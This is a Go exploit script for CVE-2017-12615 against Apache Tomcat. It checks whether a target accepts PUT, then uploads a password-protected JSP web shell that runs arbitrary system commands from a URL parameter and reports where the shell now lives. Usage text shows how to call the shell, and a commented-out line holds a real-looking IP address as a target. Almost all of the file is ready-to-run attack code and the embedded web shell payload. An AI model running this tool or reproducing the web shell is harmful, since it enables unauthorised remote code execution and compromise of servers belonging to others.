package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	// url := "http://118.193.33.101:8080/"
	if len(os.Args) == 1 {
		fmt.Printf(`
 @@@@@@@ @@@  @@@ @@@@@@@@           @@@@@@   @@@@@@   @@@ @@@@@@@@           @@@  @@@@@@    @@@@@   @@@ @@@@@@@ 
!@@      @@!  @@@ @@!               @@   @@@ @@!  @@@ @@@@      @@!          @@@@ @@   @@@ @@!@     @@@@ !@@     
!@!      @!@  !@! @!!!:!   @!@!@!@!   .!!@!  @!@  !@!  !@!     @!!  @!@!@!@!  !@!   .!!@!  @!@!@!@   !@! !!@@!!  
:!!       !: .:!  !!:                !!:     !!:  !!!  !!!  .!!:              !!!  !!:     !!:  !!!  !!!     !:! 
 :: :: :    ::    : :: ::           :.:: :::  : : ::   ::  : :                ::  :.:: :::  : : ::   ::  :: : :  
                                                                                                             --w0x68y
`)
		fmt.Println("Usage: CVE-2017-12615 <domain>")
		fmt.Println("Shell usage: xxx.jsp?cmd=id&pwd=0909")
		os.Exit(3)
	}
	url := os.Args[1]

	timeUnix := strconv.FormatInt(time.Now().Unix(), 10)
	payload := strings.NewReader(`<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("0909".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>`)

	// fmt.Println(payload)
	// fmt.Println(timeUnix)

	urlstring := url + "/" + timeUnix + ".jsp/"

	Oreq, _ := http.NewRequest("OPTIONS", url, nil)
	Ores, err := http.DefaultClient.Do(Oreq)
	if err != nil {
		fmt.Printf("\033[1;31;40m%s\033[0m\n", err)
		return
	}
	Header, _ := Ores.Header["Allow"]
	if Ores.StatusCode != 200 || strings.Contains(Header[0], "PUT") != true {
		fmt.Printf("\033[1;31;40m%s\033[0m\n", "Connection error or not support PUT requests!")
		fmt.Println(Ores)
		return
	}

	req, _ := http.NewRequest("PUT", urlstring, payload)
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("Date", "Wed, 12 Sep 2020 02:10:09 GMT")
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36")
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("\033[1;31;40m%s\033[0m\n", err)
		return
	}
	defer res.Body.Close()
	body, _ := ioutil.ReadAll(res.Body)

	// fmt.Println(res)
	if res.StatusCode == 201 {
		fmt.Printf("\033[1;32;40m%s\033[0m\n", "Shell Here:"+strings.Trim(urlstring, "/"))
	} else {
		fmt.Printf("\033[1;31;40m%s\033[0m\n", "Something Error!")
		fmt.Println(res)
		fmt.Println(body)
		return
	}

	// fmt.Println(res.StatusCode)
	// fmt.Println(string(body))

}
